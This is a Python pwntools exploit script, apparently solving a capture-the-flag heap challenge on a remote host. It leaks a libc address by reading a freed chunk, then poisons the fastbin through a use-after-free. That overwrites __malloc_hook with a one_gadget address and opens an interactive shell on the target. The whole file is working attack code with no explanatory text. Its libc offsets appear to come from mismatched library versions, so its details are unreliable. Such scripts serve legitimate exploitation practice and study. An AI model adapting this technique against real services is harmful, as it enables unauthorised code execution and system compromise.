#coding:utf-8
from pwn import *
import pwnlib
# context.log_level = 'debug'
# sh = process("./pwn")
sh = remote("39.96.88.40",7020)
elf = ELF("./pwn")
# libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(index,size,content):
    sh.sendlineafter(">> ","1")
    sh.recvuntil("Input the index:\n")
    sh.sendline(str(index))
    sh.recvuntil("Input the size:\n")
    sh.sendline(str(size))
    sh.recvuntil("Input data:\n")
    sh.sendline(str(content))

def edit(index,content):
    sh.sendlineafter(">> ","2")
    sh.recvuntil("Input the index:\n")
    sh.sendline(str(index))
    sh.recvuntil("Please input the data:\n")
    sh.sendline(str(content))

def dele(index):
    sh.sendlineafter(">> ","3")
    sh.recvuntil("Input the index:\n")
    sh.sendline(str(index))

def show(index):
    sh.sendlineafter(">> ","4")
    sh.recvuntil("Input the index:\n")
    sh.sendline(str(index))

def ts():
    gdb.attach(sh)
    pause()

add(0,0x80,"aaaa")
add(1,0x68,"aaaa")
add(2,0x68,"aaaa")
dele(0)
show(0)
sh.recvuntil("Here is it :")
libc_base  = u64(sh.recv(6).ljust(8,'\x00')) - 0x3c4b78
log.info("success leak libc_addr:0x%x"%libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
system_addr = libc_base + libc.symbols['system']
one_gadget = libc_base + 0x4f2c5 # 0x4f2c5 0x4f322 0x10a38c
dele(1)
dele(2)
log.info("success get system_addr:0x%x"%system_addr)
log.info("success get malloc_hook_addr:0x%x"%malloc_hook)
edit(2,p64(malloc_hook-0x23))
add(3,0x68,"aaaa")
add(4,0x68,'\x00' * 0x13 + p64(one_gadget))
sh.sendlineafter(">> ","1")
sh.recvuntil("Input the index:\n")
sh.sendline("5")
sh.recvuntil("Input the size:\n")
sh.sendline("1")
sh.interactive()